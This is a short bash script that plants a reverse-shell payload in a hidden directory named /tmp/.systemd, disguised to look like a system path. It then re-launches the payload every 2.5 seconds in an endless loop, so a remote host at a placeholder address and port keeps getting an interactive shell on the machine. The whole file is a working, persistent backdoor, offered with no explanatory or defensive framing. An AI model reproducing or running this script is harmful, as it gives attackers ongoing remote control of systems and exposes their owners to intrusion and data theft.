#!/bin/bash
_addr=IP_ADDRESS
_port=PORT

_private='/tmp/.systemd'
mkdir -m 750 -p $_private
cat << END > $_private/.rev
#!/bin/bash
bash -i >& /dev/tcp/$_addr/$_port 0>&1
END

while true; do
    bash $_private/.rev &>/dev/null
    sleep 2.5s
done